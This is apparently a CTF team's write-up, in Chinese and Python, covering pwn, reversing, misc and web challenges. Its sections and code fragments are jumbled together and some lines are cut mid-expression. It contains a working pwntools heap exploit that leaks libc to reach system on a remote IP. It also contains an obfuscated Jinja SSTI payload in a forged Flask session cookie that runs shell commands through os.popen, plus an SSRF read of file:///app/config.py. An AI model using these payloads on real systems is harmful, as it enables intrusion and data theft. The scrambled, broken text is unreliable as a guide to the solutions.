        q = n//p
        print(p,q)
        r.sendline(str(p+q))
        break
r.interactive()
from pwn import *
context.log_level="debug"
context.arch="amd64"
context.terminal = ['tmux', 'sp', '-h']
p=remote('39.105.185.193',30007)#process("./fuzzerinstrospector")
#gdb.attach(p)
def add(x):
    p.sendafter(b'Your choice:',b'1\\n')
    p.sendafter(b'Index:',str(x).encode('ascii'))
    for _ in range(8):
        p.sendline(b'-')
    p.sendafter(b'Bitmap:',bytes(range(0,256)))
def dele(x):
    p.sendafter(b'Your choice:',b'4\\n')
    p.sendlineafter(b'Index:',str(x).encode('ascii'))
for i in range(9):
    add(i)
for i in range(9):
    dele(8-i)
for i in range(8-1):
    add(i+1)
p.sendafter(b'Your choice:',b'1\\n')
p.sendafter(b'Index:',b'0\\n')
p.sendline(str(ord('s')).encode('ascii'))
p.sendline(str(ord('h')).encode('ascii'))
for _ in range(6):
    p.sendline(b'0')
p.sendafter(b'Bitmap:',bytes(range(0,256)))
dele(7)
dele(6)
dele(5)
dele(4)
dele(3)
dele(2)
dele(1)
p.sendafter(b'Your choice:',b'1'*0x1000+b'\\n')
for i in range(7):
    add(i+1)
#input()
p.sendafter(b'Your choice:',b'1\\n')
p.sendafter(b'Index:',b'8\\n')
p.send('\\x00')
p.sendafter(b'Bitmap:',bytes(range(0,256)))
p.sendafter(b'Your choice:',b'3\\n')
p.sendafter(b'Index:',b'8\\n')
p.recvline()
leak=u64(bytes([int(p.recvline().strip().split(b' ')[1]) for _ in range(8)]))
print(hex(leak))
system=leak-0x7ffff7dd2da0+0x7ffff79e7000+0x4f420
p.sendafter(b'Your choice:',b'6\\n')
Re
catchme
datadiv_decode2726420793510661260 解密字符串
JNI_OnLoad⾥使⽤RegisterNatives注册check sub_B2A4
check对输⼊进⾏aes加密，key是 wonderfulday!!!!
然后base64编码，与 #pZ%eVSk!QNUlfNIjemL&w== ⽐较
p.send(str(system))
p.interactive()
FFunction
在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。
第⼀个参数的值是输⼊经过位置变换然后base64
Misc
Muti Operations
com.apple.sharingd.plist中找到第⼀关的时间。
第⼆关直接编写脚本画图即可。
import binascii
import struct
import base64
data = 
binascii.unhexlify('4c75155ce781d7d173f11b5022b24dcbf5615d21e79eca3fc7b5767cb98cddc7fa2
30d99d31aab0b32c9128ef2ba07d323d12de52c8fb6fbe353d8bd4e1e2e89fa66dd3965ecfe87605e7c3000
6c0c34')
data = [struct.unpack('> 5)) ^ (0x0FACEB00C + 
16 * v17)))
        v17 = mask32( v17 + ((v18 + v19) ^ (0x0DEADBEEF + (v19 >> 5)) ^ (0x0BABEC0FE + 
16 * v19)))
        v18 = mask32(v18 - 0x79B99E37)
    result.append(v17&0xffff)
    result.append(v17>>16)
    result.append(v19&0xffff)
    result.append(v19>>16)
result = [(t>>8|t)&0xff  for t in result][::-1]
result = base64.b64decode(bytearray(result))
t1 = "0123456789abcdefghijklmnopqrst"
t2 = '0t1s2r3q4p5o6n7m8l9kajbichdgef'
flag = ['' for i in range(len(result))]
for i in range(30):
    flag[ t1.index(t2[i]) ] = chr(result[i])
print(''.join(flag))
"""
Plot raw mouse data using matplotlib
For example if you pass as input a copy of '/dev/input/mice' it will replay everything 
done on a plot.
Created by: regi18
Version: 3.0.0
Github: 
"""
import struct
import matplotlib.pyplot as plt
import argparse
from tqdm import trange
xList = [0]
yList = [0]
data = [[0,0,0]]
# Sets the arguments (launch the program with --help to see them better)
parser = argparse.ArgumentParser()
parser.add_argument("inputfile", help="the input file (raw mouse data, e.g. from 
/dev/input/mice). Default name = \\"mouse.bin\\"", nargs="?", type=str, default=
["mouse.bin"])
parser.add_argument('--speed', "-s", help="set the pause between updates (in seconds)", 
nargs="?",type=float, default=0.1)
parser.add_argument('--color', "-c", help="set the color of the plot (b = blue, g = 
green, r = red, c = cyan, m = magenta, y = yellow, k = black, w = white)", 
nargs="?",type=str, default="c")
args = parser.parse_args()
f = open( args.inputfile, "rb" ); 
# Gets the mouse informations from the file (b = button, x = x coordinate, y = y 
coordinate)
def getMouseEvent():
  b, x, y = struct.unpack('3b',f.read(3))
  data.append([x + (data[len(data)-1][0]), y + (data[len(data)-1][1]), b & 0x1])
draw = False
try:
  for _ in trange(2740):
    b, x, y = struct.unpack('3b',f.read(3))
    data.append([x + (data[len(data)-1][0]), y + (data[len(data)-1][1]), b & 0x1])
finally:
  # Enable interactive mode (matplotlib)
  plt.ion()
  cnt = 0
  # Iterate over the mouse data
  for a,i in enumerate(data):
    # if left button clicked, append the data to these new lists
Web
pingpingping
读⽂件加空格即可绕过
读cmdline泄露secret，SSTI
    if i[2] == 1 and data[a-1][2] != 0:
      draw = True
      xList.append(i[0])
      yList.append(i[1])
    # if the left button wasn't press, but in the cycle before it was, updates the 
canvas
    elif data[a-1][2] == 1:
      plt.savefig(f"mouse_{cnt}.png")
      # clear the canvas
      plt.clf()
      cnt += 1
      plt.plot(xList, yList, args.color+",")
      plt.pause(args.speed)
    elif i[2] == 0:
      draw = False
      xList.append(i[0])
      yList.append(i[1])
    else:
      plt.savefig(f"mouse_{cnt}.png")
      # clear the canvas
      plt.clf()
      cnt += 1
      plt.plot(xList, yList, args.color+",")
      plt.pause(args.speed)
  # Disable interactive mode, and leave plot open
  plt.ioff()
  plt.savefig(f"mouse_{cnt}.png")
  # plt.show()
  f.close()
  exit()
import os
cmdtmpl = r'''flask-unsign  --sign --cookie "{'username':'{% if 
\\'\\'[\\'__cla\\'[\\'__add__\\'](\\'ss__\\')][\\'__base__\\']
[\\'__subcla\\'[\\'__add__\\'](\\'sses__\\')]()
[\\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\'[\\'__len__\\']()]
[\\'__in\\'[\\'__add__\\'](\\'it__\\')][\\'__gl\\'[\\'__add__\\'](\\'obals__\\')]
[\\'__buil\\'[\\'__add__\\'](\\'tins__\\')][\\'eval\\']
(\\'__import__(\\"o\\'[\\'__add__\\'](\\'s\\")\\'))[\\'pop\\'[\\'__add__\\'](\\'en\\')]
(\\'testb=\\$(expr substr \\"\\$PATH\\" \\'[\\'__add__\\'](\\'a\\'[\\'__len__\\']()
[\\'__repr__\\']())[\\'__add__\\'](\\' \\')[\\'__add__\\'](\\'a\\'[\\'__len__\\']()
[\\'__repr__\\']())[\\'__add__\\'](\\');rm \\${testb}tmp\\${testb}aaaa\\')) 
%}nulltest{% endif %}'}" --secret 'Guess_fl4gName'
'''
rpl = "a"*59
payload = 'cat /f* > /tmp/testzz'
import requests
if 1==1:
    i = 200
    cmd = cmdtmpl.replace(rpl, "a"*i)
    tt = os.popen(cmd).read().strip()
    print(i, tt)
    burp0_url = ""
    # burp0_url = ""
    burp0_cookies = {"session": tt}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) 
Gecko/20100101 Firefox/102.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
, "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-
urlencoded", "Origin": "", "Connection": "close", "Referer": 
"", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"url": " file:///app/config.py"}
    a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, 
data=burp0_data)
    print(a.status_code)
    print(a.text)
    if "nulltest" in a.text:
        print("succ",str(i))
        exit()
easy_tou
rce+ssrf打smbd